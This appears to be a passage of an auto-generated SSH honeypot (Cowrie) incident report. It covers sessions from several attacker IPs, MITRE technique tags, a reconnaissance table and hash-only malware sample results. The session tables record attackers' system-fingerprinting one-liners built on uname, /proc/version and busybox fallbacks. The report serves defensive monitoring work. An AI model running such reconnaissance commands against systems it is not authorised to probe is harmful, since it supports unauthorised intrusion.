| `2026-09-19 20:46:33` | `cowrie.session.connect` |
| `2026-09-19 20:46:33` | `cowrie.client.version` |
| `2026-09-19 20:46:33` | `cowrie.client.kex` |
| `2026-09-19 20:46:34` | `cowrie.login.success` |
| `2026-09-19 20:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.99.104[.]96` to AbuseIPDB if not already reported
- [ ] Block `93.99.104[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a21b41732fe6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:47 |
| **Last Seen** | 2026-09-19 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:47:28` | `cowrie.session.connect` |
| `2026-09-19 20:47:28` | `cowrie.client.version` |
| `2026-09-19 20:47:28` | `cowrie.client.kex` |
| `2026-09-19 20:47:28` | `cowrie.login.success` |
| `2026-09-19 20:47:29` | `cowrie.session.params` |
| `2026-09-19 20:47:29` | `cowrie.command.input` |
| `2026-09-19 20:47:29` | `cowrie.log.closed` |
| `2026-09-19 20:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a10c0e16cc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:47 |
| **Last Seen** | 2026-09-19 20:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:47:34` | `cowrie.session.connect` |
| `2026-09-19 20:47:35` | `cowrie.client.version` |
| `2026-09-19 20:47:35` | `cowrie.client.kex` |
| `2026-09-19 20:47:36` | `cowrie.login.success` |
| `2026-09-19 20:47:36` | `cowrie.session.params` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.success` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:36` | `cowrie.command.input` |
| `2026-09-19 20:47:37` | `cowrie.log.closed` |
| `2026-09-19 20:47:38` | `cowrie.session.params` |
| `2026-09-19 20:47:38` | `cowrie.command.input` |
| `2026-09-19 20:47:38` | `cowrie.log.closed` |
| `2026-09-19 20:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa852d7a6c8d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:48 |
| **Last Seen** | 2026-09-19 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:48:59` | `cowrie.session.connect` |
| `2026-09-19 20:48:59` | `cowrie.client.version` |
| `2026-09-19 20:48:59` | `cowrie.client.kex` |
| `2026-09-19 20:48:59` | `cowrie.login.success` |
| `2026-09-19 20:49:00` | `cowrie.session.params` |
| `2026-09-19 20:49:00` | `cowrie.command.input` |
| `2026-09-19 20:49:00` | `cowrie.log.closed` |
| `2026-09-19 20:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a82b9e3611

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:49 |
| **Last Seen** | 2026-09-19 20:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:49:31` | `cowrie.session.connect` |
| `2026-09-19 20:49:31` | `cowrie.client.version` |
| `2026-09-19 20:49:31` | `cowrie.client.kex` |
| `2026-09-19 20:49:32` | `cowrie.login.success` |
| `2026-09-19 20:49:33` | `cowrie.session.params` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.success` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.command.input` |
| `2026-09-19 20:49:33` | `cowrie.log.closed` |
| `2026-09-19 20:49:34` | `cowrie.session.params` |
| `2026-09-19 20:49:34` | `cowrie.command.input` |
| `2026-09-19 20:49:34` | `cowrie.log.closed` |
| `2026-09-19 20:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9620cb837bdc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:50 |
| **Last Seen** | 2026-09-19 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:50:29` | `cowrie.session.connect` |
| `2026-09-19 20:50:29` | `cowrie.client.version` |
| `2026-09-19 20:50:29` | `cowrie.client.kex` |
| `2026-09-19 20:50:30` | `cowrie.login.success` |
| `2026-09-19 20:50:30` | `cowrie.session.params` |
| `2026-09-19 20:50:30` | `cowrie.command.input` |
| `2026-09-19 20:50:30` | `cowrie.log.closed` |
| `2026-09-19 20:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5aaa3932e0a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:52 |
| **Last Seen** | 2026-09-19 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:52:05` | `cowrie.session.connect` |
| `2026-09-19 20:52:05` | `cowrie.client.version` |
| `2026-09-19 20:52:05` | `cowrie.client.kex` |
| `2026-09-19 20:52:05` | `cowrie.login.success` |
| `2026-09-19 20:52:06` | `cowrie.session.params` |
| `2026-09-19 20:52:06` | `cowrie.command.input` |
| `2026-09-19 20:52:06` | `cowrie.log.closed` |
| `2026-09-19 20:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e26f696b66

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:53 |
| **Last Seen** | 2026-09-19 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:53:27` | `cowrie.session.connect` |
| `2026-09-19 20:53:27` | `cowrie.client.version` |
| `2026-09-19 20:53:27` | `cowrie.client.kex` |
| `2026-09-19 20:53:28` | `cowrie.login.success` |
| `2026-09-19 20:53:29` | `cowrie.session.params` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.success` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.command.input` |
| `2026-09-19 20:53:29` | `cowrie.log.closed` |
| `2026-09-19 20:53:30` | `cowrie.session.params` |
| `2026-09-19 20:53:30` | `cowrie.command.input` |
| `2026-09-19 20:53:30` | `cowrie.log.closed` |
| `2026-09-19 20:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b6018fe62e4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:53 |
| **Last Seen** | 2026-09-19 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:53:42` | `cowrie.session.connect` |
| `2026-09-19 20:53:42` | `cowrie.client.version` |
| `2026-09-19 20:53:42` | `cowrie.client.kex` |
| `2026-09-19 20:53:42` | `cowrie.login.success` |
| `2026-09-19 20:53:43` | `cowrie.session.params` |
| `2026-09-19 20:53:43` | `cowrie.command.input` |
| `2026-09-19 20:53:43` | `cowrie.log.closed` |
| `2026-09-19 20:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.194.10[.]16` | **36** | 2026-09-19 16:56 | 2026-09-19 20:54 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.5[.]188` | **12** | 2026-09-19 16:55 | 2026-09-19 20:21 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.207[.]150` | **4** | 2026-09-19 17:05 | 2026-09-19 17:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-09-19 17:39 | 2026-09-19 19:39 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.11[.]34` | **3** | 2026-09-19 20:36 | 2026-09-19 20:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.121.52[.]50` | **3** | 2026-09-19 20:29 | 2026-09-19 20:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **3** | 2026-09-19 19:08 | 2026-09-19 20:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `45.79.181[.]179` | **3** | 2026-09-19 19:48 | 2026-09-19 19:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `186.23.178[.]191` | **2** | 2026-09-19 17:30 | 2026-09-19 17:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-09-19 20:35 | 2026-09-19 20:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.35[.]246` | **2** | 2026-09-19 18:13 | 2026-09-19 18:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **2** | 2026-09-19 20:33 | 2026-09-19 20:40 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.12.182[.]44` | 1 | 2026-09-19 18:30 | 2026-09-19 18:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.116[.]176` | 1 | 2026-09-19 18:59 | 2026-09-19 19:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.124[.]81` | 1 | 2026-09-19 20:40 | 2026-09-19 20:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-19 18:22 | 2026-09-19 18:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]29` | 1 | 2026-09-19 17:44 | 2026-09-19 17:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-09-19 20:10 | 2026-09-19 20:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]12` | 1 | 2026-09-19 17:40 | 2026-09-19 17:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-09-19 18:54 | 2026-09-19 18:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]225` | 1 | 2026-09-19 17:47 | 2026-09-19 17:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.199.165[.]223` | 1 | 2026-09-19 18:15 | 2026-09-19 18:16 | 45s | 0 | `T1592` | 🟢 LOW |
| `31.129.235[.]7` | 1 | 2026-09-19 18:34 | 2026-09-19 18:34 | 12s | 0 | `T1592` | 🟢 LOW |
| `36.54.30[.]192` | 1 | 2026-09-19 19:21 | 2026-09-19 19:21 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-09-19 19:02 | 2026-09-19 19:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-09-19 19:42 | 2026-09-19 19:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-19 19:48 | 2026-09-19 19:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-09-19 20:35 | 2026-09-19 20:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.240.84[.]3` | 1 | 2026-09-19 20:46 | 2026-09-19 20:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.155.106[.]101` | 1 | 2026-09-19 18:34 | 2026-09-19 18:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]48` | 1 | 2026-09-19 19:31 | 2026-09-19 19:31 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-19 18:58 | 2026-09-19 18:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.218.94[.]33` | 1 | 2026-09-19 17:23 | 2026-09-19 17:24 | 68s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]141` | 1 | 2026-09-19 17:04 | 2026-09-19 17:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.225.234[.]165` | 1 | 2026-09-19 18:54 | 2026-09-19 18:55 | 11s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-09-19 17:49 | 2026-09-19 17:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-19 17:17 | 2026-09-19 17:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-19 19:20 | 2026-09-19 19:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
